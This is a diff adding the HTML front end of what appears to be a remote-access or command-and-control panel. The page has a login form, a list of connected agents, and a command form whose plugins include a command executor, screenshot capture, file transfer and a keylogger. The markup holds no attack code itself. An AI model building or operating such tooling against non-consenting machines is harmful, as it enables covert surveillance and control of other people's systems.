@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote System Control Panel</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Login Page -->
+    <div id="login-page" class="page active">
+        <div class="login-container">
+            <h1>Remote System Control</h1>
+            <form id="login-form">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" name="username" required autocomplete="username">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required autocomplete="current-password">
+                </div>
+                <button type="submit" class="btn btn-primary">Login</button>
+                <div id="login-error" class="error-message"></div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Main Dashboard -->
+    <div id="dashboard-page" class="page">
+        <header>
+            <h1>Remote System Control Panel</h1>
+            <div class="header-actions">
+                <span id="agent-count">0 Agents</span>
+                <button id="refresh-btn" class="btn btn-secondary">Refresh</button>
+                <button id="logout-btn" class="btn btn-secondary">Logout</button>
+            </div>
+        </header>
+
+        <main>
+            <!-- Agent List -->
+            <section id="agent-list-section">
+                <h2>Active Agents</h2>
+                <div id="agent-list" class="agent-grid"></div>
+                <div id="no-agents" class="empty-state">No agents connected</div>
+            </section>
+
+            <!-- Agent Detail View -->
+            <section id="agent-detail-section" class="hidden">
+                <div class="detail-header">
+                    <h2>Agent Details</h2>
+                    <button id="close-detail-btn" class="btn btn-secondary">Back to List</button>
+                </div>
+                
+                <div id="agent-detail-content">
+                    <div class="detail-info">
+                        <h3>System Information</h3>
+                        <div id="agent-info" class="info-grid"></div>
+                    </div>
+
+                    <!-- Command Execution -->
+                    <div class="command-section">
+                        <h3>Execute Command</h3>
+                        <form id="command-form">
+                            <div class="form-group">
+                                <label for="plugin-select">Plugin</label>
+                                <select id="plugin-select" required>
+                                    <option value="">Select plugin...</option>
+                                    <option value="executor">Command Executor</option>
+                                    <option value="screenshot">Screenshot</option>
+                                    <option value="file_transfer">File Transfer</option>
+                                    <option value="keylogger">Keylogger</option>
+                                    <option value="systeminfo">System Info</option>
+                                </select>
+                            </div>
+                            <div class="form-group" id="command-input-group">
+                                <label for="command-input">Command</label>
+                                <textarea id="command-input" rows="3" placeholder="Enter command or JSON arguments"></textarea>
+                            </div>
+                            <button type="submit" class="btn btn-primary">Execute</button>
+                        </form>
+                        <div id="command-result" class="result-box hidden"></div>
+                    </div>
+
+                    <!-- Command History -->
+                    <div class="history-section">
+                        <h3>Command History</h3>
+                        <div class="history-controls">
+                            <input type="text" id="history-filter" placeholder="Filter history...">
+                            <button id="refresh-history-btn" class="btn btn-secondary">Refresh</button>
+                        </div>
+                        <div id="command-history" class="history-list"></div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Screenshot Viewer Modal -->
+            <div id="screenshot-modal" class="modal hidden">
+                <div class="modal-content">
+                    <span class="close-modal">&times;</span>
+                    <h3>Screenshot</h3>
+                    <img id="screenshot-image" src="" alt="Screenshot">
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
